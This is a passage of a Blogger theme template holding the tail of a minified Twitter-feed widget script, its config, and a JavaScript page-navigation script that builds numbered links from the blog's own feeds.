if(tweets.length>maxTweets){tweets.splice(maxTweets,(tweets.length-maxTweets));authors.splice(maxTweets,(authors.length-maxTweets));times.splice(maxTweets,(times.length-maxTweets));rts.splice(maxTweets,(rts.length-maxTweets));images.splice(maxTweets,(images.length-maxTweets));permalinksURL.splice(maxTweets,(permalinksURL.length-maxTweets));}
var arrayTweets=[];var x=tweets.length;var n=0;if(dataOnly){while(n<x){arrayTweets.push({tweet:tweets[n].innerHTML,author:authors[n]?authors[n].innerHTML:'Unknown Author',time:times[n].textContent,timestamp:times[n].getAttribute('datetime').replace('+0000','Z').replace(/([\+\-])(\d\d)(\d\d)/,'$1$2:$3'),image:extractImageUrl(images[n]),rt:rts[n],tid:tids[n],permalinkURL:(permalinksURL[n]===undefined)?'':permalinksURL[n].href});n++;}}else{while(n<x){if(typeof(formatterFunction)!=='string'){var datetimeText=times[n].getAttribute('datetime');var newDate=new Date(times[n].getAttribute('datetime').replace(/-/g,'/').replace('T',' ').split('+')[0]);var dateString=formatterFunction(newDate,datetimeText);times[n].setAttribute('aria-label',dateString);if(tweets[n].textContent){if(supportsClassName){times[n].textContent=dateString;}else{var h=document.createElement('p');var t=document.createTextNode(dateString);h.appendChild(t);h.setAttribute('aria-label',dateString);times[n]=h;}}else{times[n].textContent=dateString;}}
var op='';if(parseLinks){if(targetBlank){targetLinksToNewWindow(tweets[n]);if(printUser){targetLinksToNewWindow(authors[n]);}}
if(printUser){op+='<div class="user">'+strip(authors[n].innerHTML)+'</div>';}
op+='<i class="fa fa-twitter"></i><p class="tweet">'+strip(tweets[n].innerHTML)+'</p>';if(printTime){if(permalinks){op+='<p class="timePosted"><a href="'+permalinksURL[n]+'">'+times[n].getAttribute('aria-label')+'</a></p>';}else{op+='<p class="timePosted">'+
times[n].getAttribute('aria-label')+'</p>';}}}else{if(tweets[n].textContent){if(printUser){op+='<p class="user">'+authors[n].textContent+'</p>';}
op+='<p class="tweet">'+tweets[n].textContent+'</p>';if(printTime){op+='<p class="timePosted">'+times[n].textContent+'</p>';}}else{if(printUser){op+='<p class="user">'+authors[n].textContent+'</p>';}
op+='<p class="tweet">'+tweets[n].textContent+'</p>';if(printTime){op+='<p class="timePosted">'+times[n].textContent+'</p>';}}}
if(showInteractionLinks){op+='<p class="interact"><a href="https://twitter.com/intent/'+'tweet?in_reply_to='+tids[n]+'" class="twitter_reply_icon"'+
(targetBlank?' target="_blank">':'>')+'Reply</a><a href="https://twitter.com/intent/retweet?'+'tweet_id='+tids[n]+'" class="twitter_retweet_icon"'+
(targetBlank?' target="_blank">':'>')+'Retweet</a>'+'<a href="https://twitter.com/intent/favorite?tweet_id='+
tids[n]+'" class="twitter_fav_icon"'+
(targetBlank?' target="_blank">':'>')+'Favorite</a></p>';}
if(showImages&&images[n]!==undefined&&extractImageUrl(images[n])!==undefined){op+='<div class="media">'+'<img src="'+extractImageUrl(images[n])+'" alt="Image from tweet" />'+'</div>';}
if(showImages){arrayTweets.push(op);}else if(!showImages&&tweets[n].textContent.length){arrayTweets.push(op);}
n++;}}
handleTweets(arrayTweets);inProgress=false;if(queue.length>0){twitterFetcher.fetch(queue[0]);queue.splice(0,1);}}};window.__twttrf=twitterFetcher;window.twitterFetcher=twitterFetcher;return twitterFetcher;}));


var config1 = {
 "profile": {"screenName": 'way2themes'},
  "domId": 'twitter-feed',
  "maxTweets": 4,
 "showUser": false,
  "enableLinks": true
};

twitterFetcher.fetch(config1);
//]]> 
</script>
<b:if cond='data:blog.pageType != &quot;static_page&quot;'>
<b:if cond='data:blog.pageType!= &quot;item&quot;'>
<b:if cond='data:blog.pageType != &quot;error_page&quot;'>
<!--Page Navigation Starts-->
<script type='text/javascript'>
var postperpage= perPage;
var numshowpage=3;
var upPageWord =&#39;Prev&#39;;
var downPageWord =&#39;Next&#39;;
var urlactivepage=location.href;
var home_page=&quot;/&quot;;
</script>
<script type='text/javascript'>
//<![CDATA[
var nopage;var jenis;var nomerhal;var lblname1;halamanblogger();function loophalaman(banyakdata){var html='';nomerkiri=parseInt(numshowpage/2);if(nomerkiri==numshowpage-nomerkiri){numshowpage=nomerkiri*2+1}mulai=nomerhal-nomerkiri;if(mulai<1)mulai=1;maksimal=parseInt(banyakdata/postperpage)+1;if(maksimal-1==banyakdata/postperpage)maksimal=maksimal-1;akhir=mulai+numshowpage-1;if(akhir>maksimal)akhir=maksimal;html+="<div class='pagenavi'><span class='showpageOf'>Page "+nomerhal+' of '+maksimal+"</span>";var prevnomer=parseInt(nomerhal)-1;if(nomerhal>1){if(nomerhal==2){if(jenis=="page"){html+='<span class="showpage"><a href="'+home_page+'">'+upPageWord+'</a></span>'}else{html+='<span class="showpageNum"><a href="/search/label/'+lblname1+'?&max-results='+postperpage+'">'+upPageWord+'</a></span>'}}else{if(jenis=="page"){html+='<span class="showpageNum"><a href="#" onclick="redirectpage('+prevnomer+');return false">'+upPageWord+'</a></span>'}else{html+='<span class="showpageNum"><a href="#" onclick="redirectlabel('+prevnomer+');return false">'+upPageWord+'</a></span>'}}}if(mulai>1){if(jenis=="page"){html+='<span class="showpageNum"><a href="'+home_page+'">1</a></span>'}else{html+='<span class="showpageNum"><a href="/search/label/'+lblname1+'?&max-results='+postperpage+'">1</a></span>'}}if(mulai>2){html+='  '}for(var jj=mulai;jj<=akhir;jj++){if(nomerhal==jj){html+='<span class="showpagePoint">'+jj+'</span>'}else if(jj==1){if(jenis=="page"){html+='<span class="showpageNum"><a href="'+home_page+'">1</a></span>'}else{html+='<span class="showpageNum"><a href="/search/label/'+lblname1+'?&max-results='+postperpage+'">1</a></span>'}}else{if(jenis=="page"){html+='<span class="showpageNum"><a href="#" onclick="redirectpage('+jj+');return false">'+jj+'</a></span>'}else{html+='<span class="showpageNum"><a href="#" onclick="redirectlabel('+jj+');return false">'+jj+'</a></span>'}}}if(akhir<maksimal-1){html+=''}if(akhir<maksimal){if(jenis=="page"){html+='<span class="showpageNum"><a href="#" onclick="redirectpage('+maksimal+');return false">'+maksimal+'</a></span>'}else{html+='<span class="showpageNum"><a href="#" onclick="redirectlabel('+maksimal+');return false">'+maksimal+'</a></span>'}}var nextnomer=parseInt(nomerhal)+1;if(nomerhal<maksimal){if(jenis=="page"){html+='<span class="showpageNum"><a href="#" onclick="redirectpage('+nextnomer+');return false">'+downPageWord+'</a></span>'}else{html+='<span class="showpageNum"><a href="#" onclick="redirectlabel('+nextnomer+');return false">'+downPageWord+'</a></span></div>'}}var pageArea=document.getElementsByName("pageArea");var blogPager=document.getElementById("blog-pager");for(var p=0;p<pageArea.length;p++){pageArea[p].innerHTML=html}if(pageArea&&pageArea.length>0){html=''}if(blogPager){blogPager.innerHTML=html}}function hitungtotaldata(root){var feed=root.feed;var totaldata=parseInt(feed.openSearch$totalResults.$t,10);loophalaman(totaldata)}function halamanblogger(){var thisUrl=urlactivepage;if(thisUrl.indexOf("/search/label/")!=-1){if(thisUrl.indexOf("?updated-max")!=-1){lblname1=thisUrl.substring(thisUrl.indexOf("/search/label/")+14,thisUrl.indexOf("?updated-max"))}else{lblname1=thisUrl.substring(thisUrl.indexOf("/search/label/")+14,thisUrl.indexOf("?&max"))}}if(thisUrl.indexOf("?q=")==-1&&thisUrl.indexOf(".html")==-1){if(thisUrl.indexOf("/search/label/")==-1){jenis="page";if(urlactivepage.indexOf("#PageNo=")!=-1){nomerhal=urlactivepage.substring(urlactivepage.indexOf("#PageNo=")+8,urlactivepage.length)}else{nomerhal=1}document.write("<script src=\""+home_page+"feeds/posts/summary?max-results=1&alt=json-in-script&callback=hitungtotaldata\"><\/script>")}else{jenis="label";if(thisUrl.indexOf("&max-results=")==-1){postperpage=20}if(urlactivepage.indexOf("#PageNo=")!=-1){nomerhal=urlactivepage.substring(urlactivepage.indexOf("#PageNo=")+8,urlactivepage.length)}else{nomerhal=1}document.write('<script src="'+home_page+'feeds/posts/summary/-/'+lblname1+'?alt=json-in-script&callback=hitungtotaldata&max-results=1" ><\/script>')}}}function redirectpage(numberpage){jsonstart=(numberpage-1)*postperpage;nopage=numberpage;var nBody=document.getElementsByTagName('head')[0];var newInclude=document.createElement('script');newInclude.type='text/javascript';newInclude.setAttribute("src",home_page+"feeds/posts/summary?start-index="+jsonstart+"&max-results=1&alt=json-in-script&callback=finddatepost");nBody.appendChild(newInclude)}function redirectlabel(numberpage){jsonstart=(numberpage-1)*postperpage;nopage=numberpage;var nBody=document.getElementsByTagName('head')[0];var newInclude=document.createElement('script');newInclude.type='text/javascript';newInclude.setAttribute("src",home_page+"feeds/posts/summary/-/"+lblname1+"?start-index="+jsonstart+"&max-results=1&alt=json-in-script&callback=finddatepost");nBody.appendChild(newInclude)}function finddatepost(root){post=root.feed.entry[0];var timestamp1=post.published.$t.substring(0,19)+post.published.$t.substring(23,29);var timestamp=encodeURIComponent(timestamp1);if(jenis=="page"){var alamat="/search?updated-max="+timestamp+"&max-results="+postperpage+"#PageNo="+nopage}else{var alamat="/search/label/"+lblname1+"?updated-max="+timestamp+"&max-results="+postperpage+"#PageNo="+nopage}location.href=alamat}
//]]>
</script>
</b:if>
</b:if>
</b:if>
<!--Page Navigation Ends -->
</body>
</html>
